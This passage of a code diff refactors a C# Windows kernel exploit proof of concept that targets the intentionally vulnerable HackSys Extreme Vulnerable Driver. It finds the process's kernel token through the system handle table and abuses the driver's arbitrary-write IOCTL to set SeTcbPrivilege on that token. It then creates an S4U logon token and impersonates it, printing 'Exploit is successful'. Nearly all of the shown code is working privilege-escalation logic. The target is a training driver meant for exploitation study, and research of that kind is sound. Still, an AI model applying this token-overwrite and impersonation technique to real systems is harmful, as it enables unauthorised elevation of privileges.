+                    else
+                        pEntryBuffer = new IntPtr(pInfoBuffer.ToInt32() + (IntPtr.Size * 2) + (nEntrySize * idx));
+
+                    var entry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(
+                        pEntryBuffer,
+                        typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
+
+                    if ((entry.UniqueProcessId == new IntPtr(pid)) &&
+                        (entry.HandleValue == hToken))
+                    {
+                        pObject = entry.Object;
+                        break;
+                    }
                 }
 
-                pEntryOffset = new IntPtr(pEntryOffset.ToInt64() + entrySize);
+                Marshal.FreeHGlobal(pInfoBuffer);
             }
-
-            if (pObject == IntPtr.Zero)
-                Console.WriteLine("[-] Failed to get target entry.\n");
-
-            Marshal.FreeHGlobal(infoBuffer);
-            CloseHandle(hToken);
 
             return pObject;
-        }
-
-
-        static IntPtr GetDeviceHandle(string deviceName)
-        {
-            int error;
-
-            Console.WriteLine("[>] Trying to open device driver.");
-            Console.WriteLine("    |-> Device Path : {0}", deviceName);
-
-            IntPtr hDevice = CreateFile(
-                deviceName,
-                FileAccess.ReadWrite,
-                FileShare.ReadWrite,
-                IntPtr.Zero,
-                FileMode.Open,
-                FileAttributes.Normal,
-                IntPtr.Zero);
-
-            if (hDevice == INVALID_HANDLE_VALUE)
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to get device handle.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-
-                return IntPtr.Zero;
-            }
-
-            Console.WriteLine("[+] Got a device handle.");
-            Console.WriteLine("    |-> hDevice: 0x{0}", hDevice.ToString("X"));
-
-            return hDevice;
-        }
-
-
-        static IntPtr GetInformationFromToken(
-            IntPtr hToken,
-            TOKEN_INFORMATION_CLASS tokenInfoClass)
-        {
-            bool status;
-            int error;
-            int length = 4;
-            IntPtr buffer;
-
-            do
-            {
-                buffer = Marshal.AllocHGlobal(length);
-                ZeroMemory(buffer, length);
-                status = GetTokenInformation(
-                    hToken, tokenInfoClass, buffer, length, out length);
-                error = Marshal.GetLastWin32Error();
-
-                if (!status)
-                    Marshal.FreeHGlobal(buffer);
-            } while (!status && (error == ERROR_INSUFFICIENT_BUFFER || error == ERROR_BAD_LENGTH));
-
-            if (!status)
-                return IntPtr.Zero;
-
-            return buffer;
         }
 
 
         static string GetWin32ErrorMessage(int code, bool isNtStatus)
         {
             int nReturnedLength;
-            ProcessModuleCollection modules;
-            FormatMessageFlags dwFlags;
             int nSizeMesssage = 256;
             var message = new StringBuilder(nSizeMesssage);
-            IntPtr pNtdll = IntPtr.Zero;
+            var dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
+            var pNtdll = IntPtr.Zero;
 
             if (isNtStatus)
             {
-                modules = Process.GetCurrentProcess().Modules;
-
-                foreach (ProcessModule mod in modules)
+                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
                 {
-                    if (string.Compare(
-                        Path.GetFileName(mod.FileName),
-                        "ntdll.dll",
-                        StringComparison.OrdinalIgnoreCase) == 0)
+                    if (CompareIgnoreCase(Path.GetFileName(module.FileName), "ntdll.dll"))
                     {
-                        pNtdll = mod.BaseAddress;
+                        pNtdll = module.BaseAddress;
+                        dwFlags |= FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE;
                         break;
                     }
                 }
-
-                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
-                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
-            }
-            else
-            {
-                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
             }
 
             nReturnedLength = FormatMessage(
@@ -1195,96 +998,82 @@ namespace TcbS4uImpersonationVariant
                 IntPtr.Zero);
 
             if (nReturnedLength == 0)
-            {
                 return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
-            }
             else
-            {
-                return string.Format(
-                    "[ERROR] Code 0x{0} : {1}",
-                    code.ToString("X8"),
-                    message.ToString().Trim());
-            }
+                return string.Format("[ERROR] Code 0x{0} : {1}", code.ToString("X8"), message.ToString().Trim());
         }
 
 
         static bool ImpersonateThreadToken(IntPtr hImpersonationToken)
         {
-            int error;
+            IntPtr pImpersonationLevel = Marshal.AllocHGlobal(4);
+            bool status = ImpersonateLoggedOnUser(hImpersonationToken);
 
-            Console.WriteLine("[>] Trying to impersonate thread token.");
-            Console.WriteLine("    |-> Current Thread ID : {0}", GetCurrentThreadId());
-
-            if (!ImpersonateLoggedOnUser(hImpersonationToken))
+            if (status)
             {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to impersonation.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                NTSTATUS ntstatus = NtQueryInformationToken(
+                    WindowsIdentity.GetCurrent().Token,
+                    TOKEN_INFORMATION_CLASS.TokenImpersonationLevel,
+                    pImpersonationLevel,
+                    4u,
+                    out uint _);
+                status = (ntstatus == STATUS_SUCCESS);
 
-                return false;
+                if (status)
+                {
+                    var level = (SECURITY_IMPERSONATION_LEVEL)Marshal.ReadInt32(pImpersonationLevel);
+
+                    if (level == SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation)
+                        status = true;
+                    else if (level == SECURITY_IMPERSONATION_LEVEL.SecurityDelegation)
+                        status = true;
+                    else
+                        status = false;
+                }
             }
 
-            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
-            IntPtr pImpersonationLevel = GetInformationFromToken(
-                hCurrentToken,
-                TOKEN_INFORMATION_CLASS.TokenImpersonationLevel);
-            var impersonationLevel = (SECURITY_IMPERSONATION_LEVEL)Marshal.ReadInt32(
-                pImpersonationLevel);
-            LocalFree(pImpersonationLevel);
+            Marshal.FreeHGlobal(pImpersonationLevel);
 
-            if (impersonationLevel == SECURITY_IMPERSONATION_LEVEL.SecurityIdentification)
-            {
-                Console.WriteLine("[-] Failed to impersonation.");
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Impersonation is successful.");
-
-                return true;
-            }
+            return status;
         }
 
 
-        static void OverwriteTokenPrivileges(
-            IntPtr hDevice,
-            IntPtr tokenPointer,
-            ulong privValue)
+        static bool OverwriteTokenPrivileges(IntPtr hDevice, IntPtr tokenPointer, ulong privValue)
         {
             IntPtr pParent = new IntPtr(tokenPointer.ToInt64() + 0x40);
             IntPtr pEnabled = new IntPtr(tokenPointer.ToInt64() + 0x48);
+            bool status = WritePointer(hDevice, pParent, new IntPtr((long)privValue));
 
-            Console.WriteLine("[>] Trying to overwrite token.");
+            if (status)
+                status = WritePointer(hDevice, pEnabled, new IntPtr((long)privValue));
 
-            WritePointer(hDevice, pParent, new IntPtr((long)privValue));
-            WritePointer(hDevice, pEnabled, new IntPtr((long)privValue));
+            return status;
         }
 
 
-        static void WritePointer(IntPtr hDevice, IntPtr where, IntPtr what)
+        static bool WritePointer(IntPtr hDevice, IntPtr pWhere, IntPtr pWhatToWrite)
         {
-            uint ioctl = 0x22200B;
-            IntPtr inputBuffer = Marshal.AllocHGlobal(IntPtr.Size * 2);
-            IntPtr whatBuffer = Marshal.AllocHGlobal(IntPtr.Size);
-            Marshal.Copy(BitConverter.GetBytes(what.ToInt64()), 0, whatBuffer, IntPtr.Size);
-            IntPtr[] inputArray = new IntPtr[2];
-            inputArray[0] = whatBuffer; // what
-            inputArray[1] = where; // where
-            Marshal.Copy(inputArray, 0, inputBuffer, 2);
+            bool status;
+            IntPtr pInputBuffer = Marshal.AllocHGlobal(IntPtr.Size * 2);
+            IntPtr pWhatBuffer = Marshal.AllocHGlobal(IntPtr.Size);
+            Marshal.WriteIntPtr(pWhatBuffer, pWhatToWrite);
+            Marshal.WriteIntPtr(pInputBuffer, pWhatBuffer); // what
+            Marshal.WriteIntPtr(pInputBuffer, IntPtr.Size, pWhere); // where
 
-            DeviceIoControl(hDevice, ioctl, inputBuffer, (IntPtr.Size * 2),
-                IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);
+            status = DeviceIoControl(
+                hDevice,
+                0x22200B,
+                pInputBuffer,
+                (IntPtr.Size * 2),
+                IntPtr.Zero,
+                0,
+                IntPtr.Zero,
+                IntPtr.Zero);
 
-            Marshal.FreeHGlobal(whatBuffer);
-            Marshal.FreeHGlobal(inputBuffer);
-        }
+            Marshal.FreeHGlobal(pWhatBuffer);
+            Marshal.FreeHGlobal(pInputBuffer);
 
-
-        static void ZeroMemory(IntPtr buffer, int size)
-        {
-            var nullBytes = new byte[size];
-            Marshal.Copy(nullBytes, 0, buffer, size);
+            return status;
         }
 
 
@@ -1305,47 +1094,106 @@ namespace TcbS4uImpersonationVariant
                 return;
             }
 
-            IntPtr tokenPointer = GetCurrentProcessTokenPointer();
+            Console.WriteLine("[>] Trying to find token address for this process.");
 
-            if (tokenPointer == IntPtr.Zero)
+            IntPtr pTokenPointer = GetCurrentProcessTokenPointer();
+
+            if (pTokenPointer == IntPtr.Zero)
             {
                 Console.WriteLine("[-] Failed to find nt!_TOKEN.");
                 return;
             }
-
-            string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";
-
-            IntPtr hDevice = GetDeviceHandle(deviceName);
-
-            if (hDevice == IntPtr.Zero)
+            else
             {
-                Console.WriteLine("[-] Failed to open {0}", deviceName);
-
-                return;
+                Console.WriteLine("[+] nt!_TOKEN for this process @ 0x{0}", pTokenPointer.ToString("X16"));
             }
 
-            var privs = (ulong)SepTokenPrivilegesFlags.TCB;
+            do
+            {
+                bool status;
+                IntPtr hS4uImpersonateToken;
+                string deviceName = @"\\.\HacksysExtremeVulnerableDriver";
 
-            OverwriteTokenPrivileges(hDevice, tokenPointer, privs);
-            CloseHandle(hDevice);
+                Console.WriteLine("[>] Trying to open device driver.");
+                Console.WriteLine("    [*] Device Path : {0}", deviceName);
 
-            IntPtr hS4uToken = GetMsvS4uLogonToken(
-                Environment.UserName,
-                Environment.UserDomainName,
-                SECURITY_LOGON_TYPE.Network);
+                IntPtr hDevice = CreateFile(
+                    deviceName,
+                    FileAccess.ReadWrite,
+                    FileShare.ReadWrite,
+                    IntPtr.Zero,
+                    FileMode.Open,
+                    FileAttributes.Normal,
+                    IntPtr.Zero);
 
-            if (hS4uToken == IntPtr.Zero)
-                return;
+                if (hDevice == INVALID_HANDLE_VALUE)
+                {
+                    Console.WriteLine("[-] Failed to open {0}", deviceName);
+                    Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] Got driver handle (Handle = 0x{0}).", hDevice.ToString("X"));
+                }
 
-            bool status = ImpersonateThreadToken(hS4uToken);
-            CloseHandle(hS4uToken);
+                Console.WriteLine("[>] Trying to overwrite token.");
 
-            if (!status)
-                return;
+                status = OverwriteTokenPrivileges(hDevice, pTokenPointer, (ulong)SepTokenPrivilegesFlags.TCB);
+                CloseHandle(hDevice);
 
-            Console.WriteLine("[+] Exploit is successful. Check this thread token groups.");
-            Console.WriteLine("[*] To exit this program, hit [ENTER] key or raise keyboad interrupption.");
-            Console.ReadLine();
+                if (!status)
+                {
+                    Console.WriteLine("[-] Failed to overwrite token privileges.");
+                    Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] Token privileges are overwritten successfully.");
+                }
+
+                Console.WriteLine("[>] Trying to S4U logon.");
+
+                hS4uImpersonateToken = GetMsvS4uLogonToken(Environment.UserName, Environment.UserDomainName);
+
+                if (hS4uImpersonateToken == IntPtr.Zero)
+                {
+                    Console.WriteLine("[-] Failed to create S4U logon tokens.");
+                    Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
+
+                    if (Marshal.GetLastWin32Error() == 0x00000032)
+                        Console.WriteLine("[!] This PoC does not support domain account. Try again with local account.");
+
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] S4U logon tokens are created successfully.");
+                }
+
+                if (!AdjustTokenIntegrityLevel(hS4uImpersonateToken))
+                {
+                    Console.WriteLine("[-] Failed to adjust token integrity level.");
+                    CloseHandle(hS4uImpersonateToken);
+                    break;
+                }
+
+                status = ImpersonateThreadToken(hS4uImpersonateToken);
+                CloseHandle(hS4uImpersonateToken);
+
+                if (!status)
+                {
+                    Console.WriteLine("[-] Failed to S4U logon.");
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] Exploit is successful. Check this thread token groups with TokenViewer.");
+                    Console.WriteLine("[*] To exit this program, hit [ENTER] key or raise keyboad interrupption.");
+                    Console.ReadLine();
+                }
+            } while (false);
         }
     }
 }
